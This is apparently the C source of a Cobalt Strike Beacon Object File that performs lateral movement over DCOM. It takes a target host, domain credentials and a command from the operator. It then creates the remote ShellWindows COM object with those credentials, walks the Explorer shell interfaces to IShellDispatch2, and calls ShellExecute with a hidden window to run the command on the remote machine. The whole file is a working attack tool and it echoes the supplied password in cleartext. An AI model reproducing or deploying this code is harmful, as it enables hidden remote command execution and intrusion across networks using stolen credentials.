#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include<combaseapi.h>
#include <heapapi.h>
#include "beacon.h"



DECLSPEC_IMPORT WINOLEAPI OLE32$CoInitialize (LPVOID pvReserved);
DECLSPEC_IMPORT WINOLEAPI OLE32$CLSIDFromString (LPCOLESTR lpsz, LPCLSID pclsid);
DECLSPEC_IMPORT WINOLEAPI OLE32$CoCreateInstanceEx(REFCLSID,  IUnknown*,DWORD,COSERVERINFO*, DWORD,MULTI_QI*);
WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
DECLSPEC_IMPORT WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT HRESULT  WINAPI   OLE32$IIDFromString(wchar_t * lpsz, LPIID lpiid);
DECLSPEC_IMPORT WINOLEAPI_(void) OLE32$CoUninitialize (void);
DECLSPEC_IMPORT WINOLEAUTAPI_(BSTR) OleAut32$SysAllocString(const OLECHAR *);
DECLSPEC_IMPORT WINOLEAUTAPI_(void) OLEAUT32$VariantInit(VARIANTARG *pvarg);




void go(char *buf, int len) {

	HRESULT hr = S_OK;
	IID Ipsb, Ipsv, Ipsw, Ipsfvd, Ipdisp, IpdispBackground, ISHLDISP, IshellWindowCLSID, ITopLevelSID, servicerprovider_iid;
	HWND hwnd;
	IShellBrowser* psb;
	IShellView* psv;
	IShellWindows* psw;
	IShellFolderViewDual* psfvd;
	IShellDispatch2* psd;
	IDispatch* pdisp, * pdispBackground;
	IServiceProvider* svsProvider;
	VARIANT vEmpty = { vEmpty.vt = VT_I4, vEmpty.lVal = 0 }; // VT_EMPTY


	//Initializing COM
	hr = OLE32$CoInitialize(NULL);
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "CoInitialize failed: 0x%08lx", hr);
		return;
	}



	//Better to identify the IID's here; otherwise we will get an "unreferenced symbol" error from beacon
	wchar_t* ShellBrowserI = L"{000214E2-0000-0000-C000-000000000046}";
	wchar_t* ShellViewI = L"{000214E3-0000-0000-C000-000000000046}";
	wchar_t* ShellWindowsI = L"{85CB6900-4D95-11CF-960C-0080C7F4EE85}";
	wchar_t* ShellFolderViewDualI = L"{E7A1AF80-4D96-11CF-960C-0080C7F4EE85}";
	wchar_t* Dispatch_I = L"{00020400-0000-0000-C000-000000000046}";
	wchar_t* ShellDispatch_I = L"{A4C6892C-3BA9-11D2-9DEA-00C04FB16162}";
	wchar_t* ShellWindowCLSID = L"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}";
	wchar_t* TopLevelBrowserSID = L"{4C96BE40-915C-11CF-99D3-00AA004AE837}";
	wchar_t* ServiceProviderI = L"{6D5140C1-7436-11CE-8034-00AA006009FA}";
	
	//Convert the above strings to IID's
	OLE32$IIDFromString(ShellBrowserI, &Ipsb);
	OLE32$IIDFromString(ShellViewI, &Ipsv);
	OLE32$IIDFromString(ShellWindowsI, &Ipsw);
	OLE32$IIDFromString(ShellFolderViewDualI, &Ipsfvd);
	OLE32$IIDFromString(ShellFolderViewDualI, &IpdispBackground);
	OLE32$IIDFromString(Dispatch_I, &Ipdisp);
	OLE32$IIDFromString(ShellDispatch_I, &ISHLDISP);
	OLE32$CLSIDFromString(ShellWindowCLSID, &IshellWindowCLSID);
	OLE32$CLSIDFromString(TopLevelBrowserSID, &ITopLevelSID);
	OLE32$IIDFromString(ServiceProviderI, &servicerprovider_iid);
	
	//Because (sometimes) beacon complains about undefined GUID_NULL
	const GUID GUID_NULL = { 0, 0, 0, { 0, 0, 0, 0, 0, 0, 0, 0 } };





	//DCOM necessary structs
	COSERVERINFO* srvinfo = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COSERVERINFO));
	COAUTHINFO* authInfo = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
	COAUTHIDENTITY* authidentity = NULL;
	MULTI_QI mqi[1] = { &Ipsw, NULL, hr };




	//BEACON operations
	datap parser;
	wchar_t* bwusername;
	wchar_t* bwpassword;
	wchar_t* bwdomain;
	wchar_t* bwcommand;
	wchar_t* bwtarget;
	wchar_t* bwparameters;
	int isCurrent;
	
	BeaconDataParse(&parser, buf, len);
	{
		bwtarget =		(wchar_t*)BeaconDataExtract(&parser, NULL);
		bwdomain =		(wchar_t*)BeaconDataExtract(&parser, NULL);
		bwusername =	(wchar_t*)BeaconDataExtract(&parser, NULL);
		bwpassword =	(wchar_t*)BeaconDataExtract(&parser, NULL);
		bwcommand =		(wchar_t*)BeaconDataExtract(&parser, NULL);
		bwparameters =	(wchar_t*)BeaconDataExtract(&parser, NULL);
		isCurrent = BeaconDataInt(&parser);
	}

	BeaconPrintf(CALLBACK_OUTPUT, "target: %ls", bwtarget);
	BeaconPrintf(CALLBACK_OUTPUT, "domain: %ls", bwdomain);
	BeaconPrintf(CALLBACK_OUTPUT, "username: %ls", bwusername);
	BeaconPrintf(CALLBACK_OUTPUT, "password: %ls", bwpassword);
	BeaconPrintf(CALLBACK_OUTPUT, "command: %ls", bwcommand);



	if (isCurrent == 0) //we are going to use another user so we need to populate the auth identity
	{
		authidentity = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
		authidentity->User = bwusername;
		authidentity->Password = bwpassword;
		authidentity->Domain = bwdomain;
		authidentity->UserLength = MSVCRT$wcslen(authidentity->User);
		authidentity->PasswordLength = MSVCRT$wcslen(authidentity->Password);
		authidentity->DomainLength = MSVCRT$wcslen(authidentity->Domain);
		authidentity->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
	}


	//Mostly default values 
	{
		authInfo->dwAuthnSvc = RPC_C_AUTHN_WINNT;
		authInfo->dwAuthzSvc = RPC_C_AUTHZ_NONE;
		authInfo->pwszServerPrincName = NULL;
		authInfo->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
		authInfo->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
		authInfo->pAuthIdentityData = authidentity;
		authInfo->dwCapabilities = EOAC_NONE;
	}


	//pwszName = target name, takes a hostname as well
	{
		srvinfo->dwReserved1 = 0;
		srvinfo->dwReserved2 = 0;
		srvinfo->pwszName = bwtarget;
		srvinfo->pAuthInfo = authInfo;
	}





	//Creating the COM instance
	hr = OLE32$CoCreateInstanceEx(&IshellWindowCLSID, NULL, CLSCTX_REMOTE_SERVER, srvinfo, 1, mqi);

	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "CoCreateInstanceEx failed: 0x%08lx", hr);
		return;
	}

	//Creating an object that implements IShellWindows Interface
	hr = mqi->pItf->lpVtbl->QueryInterface(mqi->pItf, &Ipsw, (void**)&psw);


	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "ShellWindows->QueryInterface failed: 0x%08lx", hr);
		goto Cleanup;
		return;
	}

	//We don't need the origianl instance anymore
	hr = mqi->pItf->lpVtbl->Release(mqi->pItf);
	
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Releaseing IShellWindows failed: 0x%08lx", hr);
		goto Cleanup;
		return;
	}


	//We don't always get the luxury of directly calling our method from lpVtbl, we can do this here because we have the header files of our interface 
	hr = psw->lpVtbl->FindWindowSW(psw, &vEmpty, &vEmpty, SWC_DESKTOP, (long*)&hwnd, SWFO_NEEDDISPATCH, &pdisp);
	
	
	



	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "FindWindowSW failed: 0x%08lx", hr);
		goto Cleanup;
		return;
	}



	hr = pdisp->lpVtbl->QueryInterface(pdisp, &servicerprovider_iid,  (void**)&svsProvider);
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "pdisp->QueryInterface failed: 0x%08lx", hr);
		goto Cleanup;
		return;
	}



	hr = svsProvider->lpVtbl->QueryService(svsProvider, &ITopLevelSID, &Ipsb,  (void**)&psb);
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "pdisp->QueryInterface failed: 0x%08lx", hr);
		goto Cleanup;
		return;
	}


	hr = psb->lpVtbl->QueryActiveShellView(psb, &psv);
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "psb->QueryActiveShellView failed: 0x%08lx", hr);
		goto Cleanup;
		return;
	}



	hr = psv->lpVtbl->GetItemObject(psv, SVGIO_BACKGROUND, &Ipdisp, (void**)&pdispBackground);
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "psv->GetItemObject failed: 0x%08lx", hr);
		goto Cleanup;
		return;
	}


	hr = pdispBackground->lpVtbl->QueryInterface(pdispBackground, &Ipsfvd, (void**)&psfvd);
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "pdispBackground->QueryInterface failed: 0x%08lx", hr);
		goto Cleanup;
		return;
	}

	hr = psfvd->lpVtbl->get_Application(psfvd, &pdisp);
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "psfvd->get_Application failed: 0x%08lx", hr);
		goto Cleanup;
		return;
	}

	hr = pdisp->lpVtbl->QueryInterface(pdisp, &ISHLDISP, (void**)&psd);
	if (!SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "pdisp->QueryInterface failed: 0x%08lx", hr);
		goto Cleanup;
		return;
	}

	{
		BSTR bstrFile = OleAut32$SysAllocString(bwcommand);
		BSTR strEmpty = OleAut32$SysAllocString(L"");

		VARIANT vOperation;
		vOperation.vt = VT_BSTR;
		vOperation.bstrVal = OleAut32$SysAllocString(L"open");


		VARIANT vShow;
		vShow.vt = VT_INT;
		vShow.intVal = SW_HIDE;

		VARIANT vArgs;
		vArgs.vt = VT_BSTR;
		vArgs.bstrVal = OleAut32$SysAllocString(bwparameters);

		VARIANT vDir;
		vDir.vt = VT_BSTR;
		vDir.bstrVal = OleAut32$SysAllocString(L"");

		psd->lpVtbl->ShellExecute(psd, bstrFile, vArgs, vDir, vOperation, vShow);
		if (!SUCCEEDED(hr)) {
			BeaconPrintf(CALLBACK_ERROR, "psd->ShellExecute failed: 0x%08lx", hr);
		}
		goto Cleanup;

	}



Cleanup:
	if (mqi->pItf != NULL)
	{
		mqi->pItf->lpVtbl->Release(mqi->pItf);
	}
	if (psb != NULL)
	{
		psb->lpVtbl->Release(psb);
	}
	if (psv != NULL)
	{
		psv->lpVtbl->Release(psv);
	}
	if (psw != NULL)
	{
		psw->lpVtbl->Release(psw);
	}
	if (psfvd != NULL)
	{
		psfvd->lpVtbl->Release(psfvd);
	}
	if (pdisp != NULL)
	{
		pdisp->lpVtbl->Release(pdisp);
	}
	if (pdispBackground != NULL)
	{
		pdispBackground->lpVtbl->Release(pdispBackground);
	}
	if (svsProvider != NULL)
	{
		svsProvider->lpVtbl->Release(svsProvider);
	}
	if (psd != NULL)
	{
		psd->lpVtbl->Release(psd);
	}
	OLE32$CoUninitialize();
}